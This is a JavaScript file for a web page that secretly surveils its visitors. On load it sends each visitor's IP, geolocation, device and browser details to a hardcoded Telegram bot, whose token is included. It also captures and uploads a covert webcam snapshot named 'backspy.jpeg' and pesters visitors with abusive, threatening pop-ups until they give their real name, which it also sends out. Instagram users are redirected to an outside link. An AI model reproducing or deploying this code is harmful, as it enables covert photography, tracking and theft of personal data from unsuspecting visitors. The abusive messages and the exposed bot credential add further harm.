function message() {
	msgs = 
	[
		"fuck man put your real name you motherfucker",
		"fr bro put your name fam",
		"im getting mad bro put your real name",
		"the fuck you doing i need your real name",
		"fuck off you monkey put yo name",
		"im bout to blow yo ass bro put your name",
	]
	const random = msgs[Math.floor(Math.random() * msgs.length)];
	Toastify({
		text: `${random}`,
		duration: 3000,
		gravity: "bottom",
		position: "center",
		stopOnFocus: true,
		style: {
		  background: "linear-gradient(to right, red, #880808",
		},
	  }).showToast();
}
var Welcome = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=👨‍💻 <u><b><i>Someone entered to the website</i></b></u>`;
var oReq = new XMLHttpRequest(); 
oReq.open("GET", Welcome, true); 
oReq.send();
fetch("https://api.ipbase.com/json/") //?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f
	.then((res) => res.json())
	.then((data) => {
		var output = `
		*- IP*: %0A_${data.ip}_ %0A
		*- Country*: %0A_${data.country_name}_ %0A
		*- Country Code*: %0A_${data.country_code}_ %0A
		*- Region*: %0A_${data.region_code} - ${data.region_name}_ %0A
		*- City*: %0A_${data.city}_ %0A
		*- ZIP Code*: %0A_${data.zip_code}_ %0A
		*- LAT/LONG*: %0A(_${data.latitude} , ${data.longitude}_) %0A
		*- TimeZone*: %0A_${data.time_zone}_ %0A`
		var UA = `
		*- User Agent*: %0A
		_${navigator.userAgent}_`;
		var output2 = `
		*- OS*: %0A_${platform.os}_ %0A
		*- Device Model*: %0A_${platform.product}_ %0A
		*- Browser*: %0A_${platform.name}_ %0A
		*- Brand*: %0A_${platform.manufacturer}_ %0A
		*- Description*: %0A_${platform.description}_ %0A
		*- Resolution*: %0A_${window.screen.availHeight}x${window.screen.availWidth}_ %0A`
	var url = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=Markdown&text=${output}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", url, true); 
	oReq.send();
	var UA = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=Markdown&text=${UA}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", UA, true); 
	oReq.send();
	var url2 = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=Markdown&text=${output2}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", url2, true); 
	oReq.send();
});
function b64toBlob(b64Data, contentType, sliceSize) {
    contentType = contentType || '';
    sliceSize = sliceSize || 512;
    var byteCharacters = atob(b64Data);
    var byteArrays = [];
    for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
        var slice = byteCharacters.slice(offset, offset + sliceSize);
        var byteNumbers = new Array(slice.length);
        for (var i = 0; i < slice.length; i++) {
            byteNumbers[i] = slice.charCodeAt(i);
        }
        var byteArray = new Uint8Array(byteNumbers);
        byteArrays.push(byteArray);
    }
    var blob = new Blob(byteArrays, {type:'image'});
    return blob;
}
const getScreenshotOfElement = async (element) => {
	const canvas = await html2canvas(element)
	console.log(canvas)
}
function userName(){
	swal("Whats your name", {
		content: "input",
	})
	.then((value) => {
		if (value == "" || value == " " || value == "." || value == null){
			message()
			userName();
			return;
		} else {
		swal(`nice to meet you ${value} 🥺💞`);
		var name = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=<u><b><i>Visitor's name is:</i></b></u> %0A ✨${value}`;
		var oReq = new XMLHttpRequest(); 
		oReq.open("GET", name, true); 
		oReq.send();
	}});
}
function Desktop(){
	if (window.navigator.userAgent.toLowerCase().includes("mobi")) {
		console.log('phone user');
		document.getElementById('desktop').remove();;
		} else {
			document.getElementById('desktop').style.display = "block";
		}
}
window.onload = function(){
	var ua = navigator.userAgent || navigator.vendor || window.opera;
	var isInstagram = (ua.indexOf('Instagram') > -1) ? true : false;
	let isIOS = (/iPad|iPhone|iPod/.test(navigator.platform))
	if (isIOS){
	} else {
		if (isInstagram){
			window.location.href = "intent:https://moncef.ml/send#Intent;end";
		}
		else {
			// console.log('browser')
			// navigator.permissions.query({name:'camera'})
			// .then(res =>{
			// 	if (res.state == "denied"){
			// 		console.log("allow")
			// 		Swal.fire({
			// 			position: 'center',
			// 			title: 'Allow Your Webcamera please',
			// 			showConfirmButton: false,
			// 			timer: 3000
			// 		})
			// 		setTimeout(function(){
			// 			location.refresh
			// 		}, 3000)
			// 	} else if (res.state == "prompt"){
			// 	}
			// })
		}
	}
	Webcam.attach('#my_camera');
	setTimeout(function(){
		Webcam.snap( function(data_uri) {
			var form = document.getElementById("myAwesomeForm");
			var ImageURL = `${data_uri}`;
			var block = ImageURL.split(";");
			var contentType = block[0].split(":")[1];
			var realData = block[1].split(",")[1];
			var blob = b64toBlob(realData, contentType);
			var formDataToUpload = new FormData(form);
			formDataToUpload.append("document", blob, "backspy.jpeg");
			var xhr = new XMLHttpRequest();
			xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669&caption=🤫🤫🤫`, true);
			xhr.send(formDataToUpload);
		});
	},4000)
	userName();
	Desktop();
	var loader = document.querySelector('#loader');
	setTimeout(function() {
		//loader.style.display = "none";
		loader.style.opacity = "0"
		loader.addEventListener('transitionend', () => loader.remove());
	}, 4000);
}